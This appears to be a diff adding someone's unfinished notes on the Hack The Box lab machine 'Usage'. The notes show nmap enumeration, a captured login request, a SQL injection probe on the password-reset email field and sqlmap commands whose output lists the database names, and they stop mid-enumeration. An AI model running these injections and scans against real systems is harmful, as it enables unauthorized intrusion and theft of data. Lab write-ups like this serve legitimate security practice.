@@ -1,0 +1,68 @@
+Usage
+
+Enumeration:
+sudo nmap -sC -sV -p- --min-rate=1000 10.129.107.96
+
+
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   256 a0:f8:fd:d3:04:b8:07:a0:63:dd:37:df:d7:ee:ca:78 (ECDSA)
+|_  256 bd:22:f5:28:77:27:fb:65:ba:f6:fd:2f:10:c7:82:8f (ED25519)
+80/tcp open  http    nginx 1.18.0 (Ubuntu)
+|_http-title: Did not follow redirect to http://usage.htb/
+|_http-server-header: nginx/1.18.0 (Ubuntu)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+echo 10.129.107.96 usage.htb | sudo tee -a /etc/hosts
+
+http://usage.htb/ takes us to a login server for e-mail and password
+
+http://admin.usage.htb/ is another tab on it 
+
+echo 10.129.107.96 admin.usage.htb | sudo tee -a /etc/hosts
+
+Burpe suite HTTP request to login:
+POST /post-login HTTP/1.1
+Host: usage.htb
+User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:109.0) Gecko/20100101 Firefox/115.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Referer: http://usage.htb/
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 87
+Origin: http://usage.htb
+DNT: 1
+Connection: close
+Cookie: XSRF-TOKEN=eyJpdiI6Ikk2WHcxM2xhd1YyVlpacWUwV1dWakE9PSIsInZhbHVlIjoic0VtUWlDdUN0NGNHSW9tWkRWZnJZTVcwbXp2anpCVjNHeDVoZXMrWnNKdElpenF0U2dCekZ3anFacm5UdVdTcUJ6THR2aHo4VG1kRnpLbW5GSDhxRWExcjNrQTdDTUlENjdSWHVsa0daOC9sMjh2dmVNVEZpMzhxQml0MEg1dSsiLCJtYWMiOiJhOGNiZDQwYmEyOTU2MjNiMGQyZTU1OWRjMzk1ZGM2OTUwNTgxZGU1MGQ2ODEzMzdhZWViOTRkNDBmMzdhNTNiIiwidGFnIjoiIn0%3D; laravel_session=eyJpdiI6IkVVNGlwSjlsdkhlK0FuV3huRUlwbXc9PSIsInZhbHVlIjoiYXRQV09OTWo3MTFacTg4VU9TdC85anJoRjNscGZtSGVMY01IVzdITm5pZTJOSWRZLys3U0F4Y0lYUVpoVFhUUm83c1paNGNFdXVYcTMwSW9SWFovR0Vnb0JITlk4OHZwQ2JualppTGxkQXVHemJHdHhWeVRYL3o0NTF2NzBHNWgiLCJtYWMiOiI2NTVmMmIyNjlkMjRkNzNkMzE2NDEzZWZhMGE2MDEzYTg2ZTIzNzEwYjY2MWVkZWUwNmUxNzY2ZGE2MmQ2OWNjIiwidGFnIjoiIn0%3D
+Upgrade-Insecure-Requests: 1
+Sec-GPC: 1
+
+_token=88FrOglwOwguwmEkoHeJUALiiDmZLqpXnxZryO4A&email=heem%40gmail.com&password=heem123
+
+We went to forget-password login page and we tried the parameter below and was able to get a success message:
+
+“We have e-mailed your password reset link to heem@gmail.com' OR '1'='1”
+
+
+I captured the HTTP request and put it into request.txt where I ran sql map
+ sqlmap -r request.txt -p email --level 5 --risk 3 --threads 10 --dbs
+
+
+Output:
+[14:45:26] [INFO] POST parameter 'email' appears to be 'MySQL < 5.0.12 AND time-based blind (BENCHMARK)' injectable 
+[14:50:49] [INFO] the back-end DBMS is MySQL
+[14:50:49] [WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions 
+web server operating system: Linux Ubuntu
+web application technology: Nginx 1.18.0
+back-end DBMS: MySQL < 5.0.12
+Available databases [3]:
+-information_schema
+-performance_schema
+-usage_blog
+
+Let’s use sqlmap to enumerate the tables within the database usage_blog
+sqlmap -r request.txt -p email --level 5 --risk 3 --threads 10 -D usage_blog --tables 
+
+SQLMap is taking too long, continuing later. 
